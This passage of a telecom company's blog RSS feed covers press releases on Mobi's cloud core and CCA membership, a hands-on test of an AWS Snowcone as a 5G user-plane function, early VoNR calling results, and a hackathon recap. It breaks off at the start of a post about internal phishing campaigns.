            <category>private networks</category>
            <category>press release</category>
        </item>
        <item>
            <title><![CDATA[Mobi gears up for expansion delivered by Working Group Two on AWS]]></title>
            <link>https://www.wgtwo.com/jp/blog/mobi-expansion-with-wg2-aws</link>
            <guid>mobi-expansion-with-wg2-aws</guid>
            <pubDate>Tue, 17 Jan 2023 00:00:00 GMT</pubDate>
            <description><![CDATA[* Hawaiian carrier Mobi is set to leverage the largest 5G network in the US]]></description>
            <content:encoded><![CDATA[<p><img loading="lazy" src="/jp/assets/images/logos-85f9812c09c5d05b9351e498a08ce6f9.png" width="1018" height="264" class="img_ev3q"></p><ul><li>Hawaiian carrier Mobi is set to leverage the largest 5G network in the US </li><li>Mobi makes strategic shift from legacy networks to deploy a cloud-native mobile core, fully managed as-a-Service</li><li>Mobi selects WG2 for 4G/5G/IMS mobile core network deployed on infrastructure from AWS to realize rapid commercial launch </li><li>Mobi disrupts the MVNO and 5G markets with differentiated service offering by tapping network APIs and global app development ecosystem</li></ul><p>HONOLULU (Hawaiʻi) and OSLO (Norway), January 17, 2023 - Mobi, a leading wireless provider in Hawaiʻi, is now expanding into the continental United States and beyond. <a href="https://www.mobi.com" target="_blank" rel="noopener noreferrer">Mobi</a> is one of only four full mobile virtual network operators (MVNOs) in the United States, where they will leverage America’s leading 5G network, with no territorial restrictions. A pilot solution goes live today.</p><p>To support a cost-effective, scalable and innovation-friendly expansion strategy, Mobi partnered with Working Group Two (WG2) to move its core network to the cloud. The WG2 mobile core runs cloud-natively on Amazon Web Services <a href="https://aws.amazon.com/telecom/" target="_blank" rel="noopener noreferrer">(AWS)</a> and empowers Mobi to build a compelling, app-first customer experience on the largest 5G nationwide network. </p><p>By choosing a scalable and flexible cloud architecture, Mobi can offer more competitive rates and faster time-to-market with new services. The Network-as-a-Service approach reduces the time it takes to develop and deploy new features and upgrades. In contrast to legacy solutions, which include only a few network updates per year, Mobi will benefit from continuous, daily upgrades. Further, with a mobile core from WG2 that is agnostic to any generation of wireless, Mobi can future-proof its network with no end-of-life and continuous maintenance and support. </p><p>With a programmable, cloud-native core, Mobi will gain unprecedented flexibility, and will realize significantly faster time-to-market with new services.  Once the WG2 mobile core is integrated with the radio network, Mobi can leverage simple APIs to determine which services to activate for every SIM or user. The network is delivered fully as-a-service and the cost is based on consumption, defined by the number and type of users/SIM cards, changing as needs and traffic fluctuate. This allows for lower barriers of entry, and a core network that can scale from single users to hundreds of millions of users.</p><p>Said Justen Burdette, CEO of Mobi:</p><blockquote><p>“Our ambition is to disrupt and challenge the status quo in the wireless industry by delivering a seamless, app-first, and engaging customer experience. By working with WG2 and AWS, we not only get access to a scalable, secure, and future-proof core network, we also improve our ability to meet the demands of our customers. It’s all about making it simple to join, affordable to use, and fun to explore what our network can offer. We’re building a brand that resonates with our customers by working with a strong ecosystem of partners."</p></blockquote><p>Said Erlend Prestgard, CEO of WG2:</p><blockquote><p>“Mobi is a standout example of a carrier that’s ready to unlock the benefits of a network-as-a-service, achievable with a consistent, programmable mobile core running on the cloud. This allows them to go live in new geographical markets in record time. The simplicity of the as-a-service operating model means that Mobi can focus on meeting customer expectations and spend their time dreaming about innovation, rather than managing complexity. We’re truly excited about joining Mobi on this journey." </p></blockquote><p>Said Fabio Cerone, Managing Director EMEA, Telco Business Unit at AWS:</p><blockquote><p>“Embracing the cloud helps carriers simplify network operations, deploy networks more rapidly, scale more easily - while still retaining full control over the network and gaining additional agility and innovation capabilities. Now the core network is only one API away from the global community of developers, which can help deliver new value for Mobi’s customers."</p></blockquote><p>As an app-first company, wholly focused on user experience, Mobi embraces an open, API-enabled core network approach. Access to WG2's global ecosystem of developers offers Mobi a selection of pre-integrated, ready-to-deploy applications for voice, messaging and data services, built by WG2’s development partners from all over the world. Following the continental U.S. rollout, Mobi also plans to leverage the same model to expand to markets including Canada, Puerto Rico and the U.S. Virgin Islands.</p><p><strong>About Mobi</strong><br>
<!-- -->Mobi, Inc. launched as the regional wireless provider for Hawaiʻi in 2005 — becoming the first carrier in the United States to offer affordable, simple, unlimited mobile service at a time when activation, overage, and hidden fees were the norm. Anyone can switch to Mobi in just seconds using the Mobi app, Apple Pay, and eSIM — with smart, friendly Mobi customer care geeks ready to help at any time digitally and at Mobi stores in Hawaiʻi. All Mobi team members are proudly represented by the Communications Workers of America (the CWA). Learn more at <a href="https://www.mobi.com" target="_blank" rel="noopener noreferrer">mobi.com</a>, or on <a href="https://fb.com/mobi" target="_blank" rel="noopener noreferrer">Facebook</a>, <a href="https://twitter.com/Mobi" target="_blank" rel="noopener noreferrer">Twitter</a>, or <a href="https://linkedin.com/company/mobi" target="_blank" rel="noopener noreferrer">LinkedIn</a>. </p><p><strong>About Working Group Two</strong><br>
<!-- -->Working Group Two has rebuilt the mobile core for simplicity, innovation, and efficiency – leveraging the web-scale playbook and operating models. Today, Working Group Two innovation enables MVNO, MNO, and Private Network Operators a secure, scalable, and reliable telco connectivity backbone that scales across all generations of mobile technologies. Our mission is to create programmable mobile networks to allow our customers and their end users to create more valuable and useful products and services. </p><p><strong>Media Contact:</strong><br>
<!-- -->Tor Odland<br>
<!-- -->Working Group Two<br>
<!-- -->+47 9909 0872<br>
<!-- -->tor(at)wgtwo.com</p>]]></content:encoded>
            <category>mobi</category>
            <category>operators</category>
            <category>5G</category>
            <category>regional</category>
            <category>USA</category>
            <category>press release</category>
        </item>
        <item>
            <title><![CDATA[Working Group Two steps up to support regional carriers in the United States]]></title>
            <link>https://www.wgtwo.com/jp/blog/joining-cca</link>
            <guid>joining-cca</guid>
            <pubDate>Mon, 09 Jan 2023 00:00:00 GMT</pubDate>
            <description><![CDATA[(OSLO, NORWAY, JAN 9, 2023) – Working Group Two today announced it has joined Competitive Carriers Association (CCA) as it continues to build its presence in the United States.]]></description>
            <content:encoded><![CDATA[<p>(OSLO, NORWAY, JAN 9, 2023) – Working Group Two today announced it has joined Competitive Carriers Association (CCA) as it continues to build its presence in the United States. </p><p>WG2 delivers a cloud-native 4G/5G core network as-a-service and as-a-platform for operators and developers. This drives the dual benefits of cost savings and revenue growth for the mobile industry. To help operators grow and differentiate, WG2 also offers a product marketplace that takes advantage of the programmable core network to create app stores of products for operators and users alike. </p><p>Erlend Prestgard, CEO of Working Group Two, said: </p><blockquote><p>"We believe this value proposition is ideal for the many regional operators across the United States, both those having to swap their networks, and those seeking to simplify and standardize their critical network operations. This allows CCA members to not only reduce complexity and save cost but focus on meeting customer needs and differentiating with new products and services.”</p></blockquote><p>As examples, some operators will want to move quickly to 5G, while others are focused on new service delivery such as multi-IMSI for watches with calls and messages. Other use cases include offering B2B products such as PBXs and customized network security products. </p><p>WG2 has a proven track record of customer deployments in Europe, including CK Hutchison (multi-country), Telenor in Sweden and eRate in Norway. As perhaps the only vendor, it has been running its core live in the public cloud since 2018. The company is also delivering private networks in Japan in collaboration with Mitsui Knowledge Industry Co,. Ltd. KI. WG2’s global core platform and product ecosystem runs on infrastructure from Amazon Web Services (AWS). </p><p>Tim Donovan, President and CEO of CCA, said:</p><blockquote><p>“We are delighted to welcome WG2 to CCA. CCA’s associate members play an integral role in the competitive carrier ecosystem, and WG2’s expertise and innovative solutions will certainly be a valuable addition for the entire membership.” </p></blockquote><p><a href="https://www.ccamobile.org" target="_blank" rel="noopener noreferrer">CCA</a> is the nation’s leading association for competitive wireless providers and stakeholders across the United States. </p><p>WG2 will be present at the <a href="https://www.ccamobile.org/cca-events#CCAEvents" target="_blank" rel="noopener noreferrer">CCA Mobile Carriers Show</a> in Pittsburgh, PA, May 2-4, 2023. </p><p><strong>About Working Group Two</strong>
Working Group Two has rebuilt the mobile core for simplicity, innovation, and efficiency - leveraging the web-scale playbook and operating models. Today, Working Group Two innovation enables MVNO, MNO and Private Network Operators a secure, scalable, and reliable telco connectivity backbone that scales across all generations of mobile technologies. Our mission is to create programmable mobile networks to allow our customers and their end users to create more valuable and useful products and services. Read more at <a href="https://wgtwo.com" target="_blank" rel="noopener noreferrer">https://wgtwo.com</a></p><p><strong>About CCA</strong>
CCA is the nation’s leading association for competitive wireless providers and stakeholders across the United States. Members range from small, rural carriers serving fewer than 5,000 customers to regional and nationwide providers serving millions of customers, as well as vendors and suppliers that provide products and services throughout the wireless communications ecosystem.</p><p><strong>Media Contact:</strong>
Tor Odland
Working Group Two
+47 9909 0872
tor(at)wgtwo.com</p>]]></content:encoded>
            <category>cca</category>
            <category>operators</category>
            <category>5G</category>
            <category>regional</category>
            <category>USA</category>
            <category>press release</category>
        </item>
        <item>
            <title><![CDATA[Unboxing the AWS Snowcone and using it as a local UPF]]></title>
            <link>https://www.wgtwo.com/jp/blog/exploring-aws-snowcone</link>
            <guid>exploring-aws-snowcone</guid>
            <pubDate>Mon, 21 Nov 2022 00:00:00 GMT</pubDate>
            <description><![CDATA[The AWS Snowcone is a small form factor server that was originally meant for data transport to AWS data centers.]]></description>
            <content:encoded><![CDATA[<p>The AWS Snowcone is a small form factor server that was originally meant for data transport to AWS data centers.
However it can also be used as a small device running compute workloads. We wanted to evaluate the performance of the
Snowcone as it is a quite intriguing piece of technology which we might want to use as a an on-premise UPF (User Plane
Function) in low-throughput 5G networks (think IoT or Proof of Concept deployments).</p><p>Specs:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token plain">Dimensions: 227 mm x 148.6 mm x 82.65 mm</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">Weight: 2,1 kg</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">vCPU(usable): 2</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">Memory(usable): 4GB</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">Storage(SSD): 14TB</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">Network: 2x10GB RJ45</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">Display: e-Ink for displaying shipping label or status</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">Power: 65W USB-C (not included)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="initial-setup">Initial Setup<a class="hash-link" href="#initial-setup" title="Direct link to heading">​</a></h2><p>Once receiving the Snowcone it still displays the shipping label on the top of the unit. The IO Ports are hidden behind
a flap at the back of the unit and the power switch including two LEDs are at the front of the unit.</p><p>Upon powering it on, the Display will show the IP address of the Snowcone along with a message that the device is Locked
and needs to be unlocked using the AWS OpsHub Software which is available for Windows, OSx and Linux (AppImage).</p><img loading="lazy" width="100%" align="middle" style="display:block;margin:auto 10px" src="/jp/0ad3488d3abe1a33f2f0946076588d34.png" class="img_ev3q"><p>In our case we wanted to use a local device, so we selected this option</p><img loading="lazy" width="80%" align="middle" style="display:block;margin:auto 10px" src="/jp/34f26115c5b9238bd3a8f82c55e12e15.png" class="img_ev3q"><p>Next up was selecting a Snowcone Device followed by the following login screen</p><img loading="lazy" width="60%" align="middle" style="display:block;margin:auto 10px" src="/jp/26a61d82feca52e29871f4ec05007217.png" class="img_ev3q"><p>At this point you have to login to your AWS Console and navigate to the “Snow Family” Service where you should see
a so-called JobID for a Snowcone. The Snowcone Job Details will let you get your Unlock Code and the Manifest File,
which are both needed to sign into the Snowcone device.</p><img loading="lazy" width="100%" align="middle" style="display:block;margin:auto 10px" src="/jp/f1587c7f6ca4901b5f1a95b76a98e7ca.png" class="img_ev3q"><p>From that point on the Snowcone is usable. It did take a few more minutes though until it downloaded the AMI images
that will run on the Snowcone.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="compute">Compute<a class="hash-link" href="#compute" title="Direct link to heading">​</a></h2><p>Since the Snowcone is very limited in resources, there are special Instance types for it:</p><ul><li>snc1.micro (1 vCPU, 1 GB RAM)</li><li>snc1.small (1 vCPU, 2 GB RAM)</li><li>snc1.medium (2 vCPU, 4GB RAM)</li></ul><p>Also there are only two AMIs available for it now. However it is possible to import EBS Snapshots onto the Snowcone,
which we have not done as the procedure was too long and we could do with the AMIs provided.</p><img loading="lazy" width="60%" align="middle" style="display:block;margin:auto 10px" src="/jp/fd89d16106a3f2ba8e73127c313c4dd6.png" class="img_ev3q"><h2 class="anchor anchorWithStickyNavbar_LWe7" id="instance">Instance<a class="hash-link" href="#instance" title="Direct link to heading">​</a></h2><p>Since our use case was to run a UPF on it, we started the largest instance type the Snowcone would allow us and
started exploring.</p><p>Since the available AMI is an Amazon Linux 2 AMI we were not super familiar with it. However, since it is Red Hat-based
we kind of knew what to expect.</p><p>The kernel coming with that AMI was a 4.14 kernel, which was too old for us, so the first thing was updating to
a 5.15 kernel. We followed this <a href="https://aws.amazon.com/premiumsupport/knowledge-center/amazon-linux-2-kernel-upgrade/" target="_blank" rel="noopener noreferrer">guide</a>
first kind of sluggish and noticed that it's not a good idea to skip instructions, thereby bricking our instance.
Which made us find out that there are no logs of the boot process or a webshell, like we are used to from EC2.</p><p>Second time's the charm though and we did have a working instance with a 5.15 kernel. Interestingly enough the
device key for SSH changed when upgrading from 4.14 to 5.4, but that was only a minor nuisance.
So we thought let's do some exploring what we actually have here.</p><img loading="lazy" width="60%" align="middle" style="display:block;margin:auto 10px" src="/jp/9821a6bddaf75c2cdd9a4d9f114343d0.png" class="img_ev3q"><p>There was not too much information here. So let's have a look at the CPU Information.</p><img loading="lazy" width="80%" align="middle" style="display:block;margin:auto 10px" src="/jp/ef9e87547e91bfd94ab2a93e7eed2414.png" class="img_ev3q"><p>So a CPU from the Xeon E3-12xx v2 line. Even though this might be the virtualization engine telling us that this is
the CPU, we are assuming that it will be something from the Ivy Bridge line. Furthermore we are assuming that it will
be a low-powered 4 Core CPU working there, where only 2 CPUs are available for the consumer.</p><p>After digging a bit through dmidecode (we are engineers right?) we also found this additional piece of information</p><img loading="lazy" width="70%" align="middle" style="display:block;margin:auto 10px" src="/jp/eb881c8f4425f7e31f227546e6763274.png" class="img_ev3q"><p>The interesting part here is that the Manufacturer is designated as Bochs, which is a x86 and AMD64 emulator.
So maybe it's not a virtualization engine driving the Instance, but an emulator?</p><p>But now back to our original plan to run a UPF (User Plane Function for 5G) on the Snowcone. For this to work we
needed 2 network interfaces as our original plan was to use DPDK to run it. This is where we quickly found out that
an Instance on Snowcone can only have 1 Virtual Network Interface (VNI).</p><p>After scouring through the documentation about Snowcone, we however found out that first of all there is another way
to configure the Snowcone. You can also configure the Snowcone with a CLI, the <a href="https://aws.amazon.com/snowball/resources/" target="_blank" rel="noopener noreferrer">SnowballEdgeClient</a>.</p><p>In there we found a different type of network Interface, the so called Direct Network Interface (DNI), and according
to documentation, the Snowcone supports up to 63 DNIs attached to it.
So we created a DNI and attached it to our instance.
To our surprise it showed up as an Intel X553 Virtual Network Function(VNF), so this is basically
Single-Root IO-Virtualization (SRIOV) at work here. Which also makes sense because the X500 series supports up
to 64 VNFs (minus the one used by the snowcone itself).</p><p>So we started deploying our DPDK-based UPF on the snowcone. Creating a DNI and attaching it to an instance was fairly
easy with the SnowballEdgeClient. However, when restarting the instance, it would not come back.
After talking to AWS we were informed that this is a bug that is related with the interface naming and
should be fixed in a future release.</p><p>For the meantime it can be circumvented by switching to <a href="https://www.freedesktop.org/wiki/Software/systemd/PredictableNetworkInterfaceNames/" target="_blank" rel="noopener noreferrer">Predictable Network Interface Names</a>.</p><img loading="lazy" width="80%" align="middle" style="display:block;margin:auto 10px" src="/jp/69fce8ddf8fe909599ae567925f1b4a9.png" class="img_ev3q"><p>Once the DNI is attached to the instance, one has to do some additional configuration on the instance for both
the VNI and DNI to get IP addresses. We found the relevant <a href="https://docs.aws.amazon.com/snowball/latest/developer-guide/network-config-ec2.html" target="_blank" rel="noopener noreferrer">guide</a>
in the AWS Documentation and our DNI got an IP Address.</p><p>With those parts out of the way, we could deploy our DPDK-based UPF on the Snowcone and could use it as a UPF.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="performance">Performance<a class="hash-link" href="#performance" title="Direct link to heading">​</a></h2><p>Evaluating the performance of the Snowcone device was actually what triggered this whole exploration. So let's look mainly at the networking performance and also slightly at the cpu performance.</p><p>For this we are mainly using iperf3 to evaluate the throughput. The Snowcone as well as our test machine here in the lab have a Intel X55x 10Gbit NIC.</p><p>When the Snowcone snc1.medium instance is the iperf Server:</p><img loading="lazy" width="80%" align="middle" style="display:block;margin:auto 10px" src="/jp/494c7b1581c6b71594c5104a274b5911.png" class="img_ev3q"><p>When the Snowcone snc1.medium instance is the iperf Client:</p><img loading="lazy" width="80%" align="middle" style="display:block;margin:auto 10px" src="/jp/93d63f2c994532e36653bf5d8010cb69.png" class="img_ev3q"><p>From these very simple benchmarks we can already see that the EC2 instance is struggling with pushing out anywhere
near line speed. In other words it seems like it is CPU bottlenecked. When running a htop while running this speedtest
does confirm that one of the CPUs hits 100% utilization every now and then. This makes sense because iperf3 is
single-threaded by design.</p><p>We then did run a speedtest to a local speedtest server using our userland UPF from a UE and this is basically
the result.</p><img loading="lazy" width="50%" align="middle" style="display:block;margin:auto 10px" src="/jp/8d2e41892f7155a1057ff23255d18748.png" class="img_ev3q"><p>Looking at htop again, we can see that now both CPU cores are pegged at 100% since the UPF is actually multithreaded.
So even if the EC2 instance in Snowcone can push about 6 Gbit/s on iperf3, with the additional overhead of
GTP encapsulation and de-encapsulation, it can only do about 180 Mbit/s.</p><p>We know that our userland UPF will be able to push around 500 Mbit/s on other machines, so this is a clear limitation
of the Snowcone.</p><p>With the DPDK based UPF however we are able to have higher throughput. DPDK will take control over the DNI and use
a poll-mode driver for packet processing. So one CPU core will always be pinned at 100% and the NIC will
disappear from the instance.</p><img loading="lazy" width="50%" align="middle" style="display:block;margin:auto 10px" src="/jp/5fad862c769c4ccdb51a613a4fca714d.png" class="img_ev3q"><p>This is actually the maximum speed we can get out of our gNodeB. So we are pretty happy with the result.</p><p>We hope you liked this short look at the AWS Snowcone, and we will for sure explore the Snowcone further. It's a
nice little device that will be especially useful for smaller deployments or PoCs of our Packet Core as it can be easily
remote-managed and transported everywhere.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="update">Update<a class="hash-link" href="#update" title="Direct link to heading">​</a></h2><p>Since the original Blog Post about Snowcone we were able to debug the problem with the DNI detach process further
and with help from AWS were able to resolve it. The fix for this should be released with an updated version of
Amazon Linux in the future according to AWS.</p>]]></content:encoded>
            <category>5G</category>
            <category>aws</category>
            <category>snowcone</category>
        </item>
        <item>
            <title><![CDATA[We have just completed our first VoNR (5G) calls in a multi-handset environment]]></title>
            <link>https://www.wgtwo.com/jp/blog/first-voice-calls-on-5g</link>
            <guid>first-voice-calls-on-5g</guid>
            <pubDate>Thu, 17 Nov 2022 00:00:00 GMT</pubDate>
            <description><![CDATA[If that headline was slightly incomprehensible to you, it means that we’ve now made it possible to call pretty much anyone from a 5G-enabled handset that is connected to the Working Group Two 5G core via a 5G antenna. To be clear, we’re not talking about making a “first” Voice over New Radio (VoNR) call (those took place way back in 2021), but about making VoNR calls from a set of major commercial off-the-shelf (COTS) 5G devices to other mobile and fixed handsets.]]></description>
            <content:encoded><![CDATA[<p>If that headline was slightly incomprehensible to you, it means that we’ve now made it possible to call pretty much anyone from a 5G-enabled handset that is connected to the Working Group Two 5G core via a 5G antenna. To be clear, we’re not talking about making a “first” Voice over New Radio (VoNR) call (those took place way back in 2021), but about making VoNR calls from a set of major commercial off-the-shelf (COTS) 5G devices to other mobile and fixed handsets. </p><p>As we see it, voice continues to be relevant across “Gs”, usage areas, and handset types. This year, we’ve continued to rapidly adapt our voice stack to emerging needs. This included enabling it for 5G Standalone (SA; also called New Radio, or NR). We’re doing this because we see strong effects of taking a platform approach, where adding something like VoNR becomes a relatively straightforward exercise. </p><p>Let’s put some emphasis on “relatively” because there are some thoughtful considerations to be made and some steps to be taken. In a pure 5G world, you’ll have a fancy new radio with high bandwidth, low latency, and the opportunity to create little (or big) slices for various use cases. In addition to the radio, you’ll have a new 5G SA core where all this beauty is enabled and managed. </p><p>The situation right now is that even if you have a “5G” logo on the top of your handset, you are - in most commercial 5G networks - actually calling via 4G. This means that your handset needs to connect to a 4G core and an IP Multimedia Subsystem (IMS) core to act as the intermediary between you and the person you want to talk to. 4G radio network coverage is significantly better in most parts of the world and pretty much all handsets out there support that “G”. </p><p>What we want is to enable a pure 5G play, that is, a 5G handset making 5G calls using exclusively a 5G stack all the way. This reduces complexity, improves reliability of calls by avoiding radio access technology changes, and enables effective use of network and handset resources (control plane and airtime). This is especially valuable in a private network or other greenfield environments. Most brownfield deployments have been designed to basically use the current network technology to support voice usage. </p><blockquote><p>For example, during early 4G deployments, 3G voice was used, delaying the actual deployment of VoLTE (4G) technology. Similarly, 5G Non-Standalone (NSA) is still using a 4G anchor to support voice calls. In a pure, greenfield deployment, such as with CBRS or sXGP spectrum types, where customers will most likely deploy a single G (either 4G for cost/maturity driven reasons, or 5G for bandwidth per cell or future-proof reasons), voice will need to be supported from day one. </p></blockquote><h2 class="anchor anchorWithStickyNavbar_LWe7" id="heres-what-we-did">Here’s what we did<a class="hash-link" href="#heres-what-we-did" title="Direct link to heading">​</a></h2><p> <strong>1.</strong> We first got a hold of a set of COTS handsets featuring the major mobile handset chipsets in the market, from the likes of MediaTek, Samsung, Qualcomm and Huawei.</p><p> <strong>2.</strong> Then we connected our cloud-based IMS core to our 5G SA core. </p><p> <strong>3.</strong> We connected our core to a commercial 5G antenna in our lab. The 5G antenna was procured from one of the major mobile network vendors. Interestingly, it didn’t support VoNR out of the box, so we had to enable that setting. </p><p> <strong>4.</strong> We then started testing the handsets (and their chipsets). We observed that they have different levels of maturity in their stacks. For example, we discovered that some handsets were unstable if they did not have access to the IMS core. </p><blockquote><p>A further explanation on that: a user equipment (UE), according to the 3GPP specs,  has a voice or data-centric setting they employ when registering on the network. For an UE with a voice-centric function, like handsets, most of them will try to connect to an IMS core. If a PDU session establishment request is not honored by the core, the handset will disconnect and reconnect, creating some fluctuations on the data connection. The only way to ensure those handsets got a proper data connection was to secure a connection to the IMS core. </p></blockquote><p> <strong>5.</strong> Ultimately, we were able to establish voice calls in all directions - to 5G, 4G handsets (VoLTE), VoWifi and so on. </p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="lets-dig-a-little-deeper">Let's dig a little deeper<a class="hash-link" href="#lets-dig-a-little-deeper" title="Direct link to heading">​</a></h2><p>5G handsets place voice calls by initiating a connection to the 5G network’s IMS core. Handsets would disconnect or underperform if they couldn’t establish that connection. The 5G core needs to implement an establishment and release of dedicated Quality of Service (QoS) flows. These flows tell the UE and antenna how to prioritize IP packets carrying call audio over other mobile data traffic. </p><p>More specifically, a QoS flow is associated with standardized 5G QoS identifiers (5QI) that among other things define packet error rate and delay budget, and whether IP packets associated with the flow get a guaranteed bit rate. Only when a dedicated QoS flow for voice is established, the scheduler of the antenna as well as the rest of the involved 5G core elements have all the ingredients to prioritize a phone call over, say, a Netflix session in the background. </p><p>The COTS handsets we tested behaved differently in how they handled the establishment of an IMS connection and QoS flow. That leads us to conclude that even in the 5G SA networks there are still some major interoperability challenges, including on the antenna side, which might be configured for data primarily, not voice. </p><p>Nevertheless, 5G SA has reached a state where its technology can be procured and used with handsets available in the market.</p>]]></content:encoded>
            <category>vonr</category>
            <category>5G</category>
            <category>4G</category>
            <category>core</category>
            <category>IMS</category>
            <category>volte</category>
        </item>
        <item>
            <title><![CDATA[Here's what happened at Hackoween 🎃]]></title>
            <link>https://www.wgtwo.com/jp/blog/hackoween-october-2022</link>
            <guid>hackoween-october-2022</guid>
            <pubDate>Thu, 03 Nov 2022 00:00:00 GMT</pubDate>
            <description><![CDATA[Just as October was about to close, we ran a hackathon, aptly named "Hackoween" 🎃]]></description>
            <content:encoded><![CDATA[<p>Just as October was about to close, we ran a hackathon, aptly named "Hackoween" 🎃</p><p>Hackdays are a great way for everyone in the company to work together in creating new innovative solutions for everyday problems.</p><p><img loading="lazy" alt="Hackoween" src="/jp/assets/images/Hackoween-566596f42826a14e6f431bc81bed9044.png" width="2040" height="1118" class="img_ev3q"></p><p>This time, we had the joy of having a hackday that included 15+ teams and yes - <em>pizza</em>. As with anything these days, a hackathon is a mix of virtual and physical. </p><h1>Hackday Presentations</h1><h2 class="anchor anchorWithStickyNavbar_LWe7" id="building-a-system-overview-for-wgtwo">Building a system overview for wgtwo<a class="hash-link" href="#building-a-system-overview-for-wgtwo" title="Direct link to heading">​</a></h2><p><em>Team: Karl Johan, Anders, Tor, Oliver, Tobias</em></p><p>Building a new "Telco 102" visualization of our system architecture - used for both internal onboarding and to aid us when we talk to customers. </p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="matrix-maximum-tracing-with-minimal-xffort">MATRIX (MAximum TRacing with mInimal Xffort)<a class="hash-link" href="#matrix-maximum-tracing-with-minimal-xffort" title="Direct link to heading">​</a></h2><p><em>Team: Karl Johan</em></p><p>Side-project to see what we could get out of our Java/Kotlin services by utilizing existing projects. Utilize the setup the Infrastructure team has made in dev around opentelemetry and XRay. The idea is to improve tracing across the stack. </p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="gophish---for-internal-anti-phishing-campaign">Gophish - for internal anti-phishing campaign<a class="hash-link" href="#gophish---for-internal-anti-phishing-campaign" title="Direct link to heading">​</a></h2><p><em>Team: Jonny, Gunnar Inge</em></p><p>The goal of this project is to deploy Gophish and setup a phishing campaign - to develop internal resilience against phishing attacks. Check out their guide to developing internal phishing campaigns <a href="https://www.wgtwo.com/blog/internal-email-phishing-campaigns/" target="_blank" rel="noopener noreferrer">on our blog.</a></p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="walicy---wasm-policy-resolving">Walicy - (wasm policy resolving)<a class="hash-link" href="#walicy---wasm-policy-resolving" title="Direct link to heading">​</a></h2><p><em>Team: Noy, Bjørn N</em></p><p>Write a library / sidecar to use wasm to implement policy resolving.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="vowifi">VoWiFi<a class="hash-link" href="#vowifi" title="Direct link to heading">​</a></h2><p><em>Team: Konstantin, Yan, Anton, Fabricio</em></p><p>To build a more cloud-native ePDG to enable Voice-over-WiFi. </p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="handover-machine-2000-hammer2000">Handover Machine 2000 (Hammer2000)<a class="hash-link" href="#handover-machine-2000-hammer2000" title="Direct link to heading">​</a></h2><p><em>Team: Holger, Sindre, Rune, Alain, Jacob</em></p><p>For testing handover between two physical antennas a phone needs to move between the coverage of two antennas. This has historically been done by moving a human holding a phone between two antennas. We attenuenated the radio signal with a rotating BLANDA BLANK serving bowl from Ikea - remotely controlled, of course! </p><p>In a bright future, we want a physical contraption that will move a phone between the coverage areas of the antennas. </p><p><img loading="lazy" alt="The Hammer 2000" src="/jp/assets/images/hammer2000-0df5b21e2b86292d19de17ea2fe8c74d.jpg" width="4032" height="3024" class="img_ev3q"></p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="cloud-pbx---call-center">Cloud PBX - call center<a class="hash-link" href="#cloud-pbx---call-center" title="Direct link to heading">​</a></h2><p><em>Team: Sergey</em></p><p>WTP and WebRTC-based minimalist PBX (with no SIP). </p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="explore-vitebazeljavalinvuepress-for-instant-development-feedback">Explore Vite+Bazel(+Javalin/VuePress) for instant development feedback<a class="hash-link" href="#explore-vitebazeljavalinvuepress-for-instant-development-feedback" title="Direct link to heading">​</a></h2><p><em>Team: Jørund, Tibor</em></p><p>Seeking a smoother developer experience. The goal: instant changes (without reloading the page). </p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="easier-voice-deploys">Easier voice deploys<a class="hash-link" href="#easier-voice-deploys" title="Direct link to heading">​</a></h2><p><em>Team: Atanas</em> </p><p>Even more flexibility in deploying voice infrastructure through IP-operator magic. </p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="improve-visibility-of-the-subscriber-activity-in-our-network">Improve visibility of the subscriber activity in our network<a class="hash-link" href="#improve-visibility-of-the-subscriber-activity-in-our-network" title="Direct link to heading">​</a></h2><p><em>Team: Tech support team, Nicholas, Pavel, Fabricio</em></p><p>Dashboard showing subscriber activity and be able to drill down and filter the activity in a variety of ways. </p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="hackoween-for-beginners">Hackoween for beginners<a class="hash-link" href="#hackoween-for-beginners" title="Direct link to heading">​</a></h2><p><em>Team: Theresa, Oda</em></p><p>What two non-hackers can achieve in three days (building an onboarding website).</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="kubernetes-service-canary-ish">Kubernetes service canary (ish)<a class="hash-link" href="#kubernetes-service-canary-ish" title="Direct link to heading">​</a></h2><p><em>Team: Didier</em></p><p>POC of scripts to add/remove a canary pod to k8s services dynamically.</p>]]></content:encoded>
            <category>hackathon</category>
        </item>
        <item>
            <title><![CDATA[Our guide to internal phishing campaigns]]></title>
            <link>https://www.wgtwo.com/jp/blog/internal-email-phishing-campaigns</link>
            <guid>internal-email-phishing-campaigns</guid>
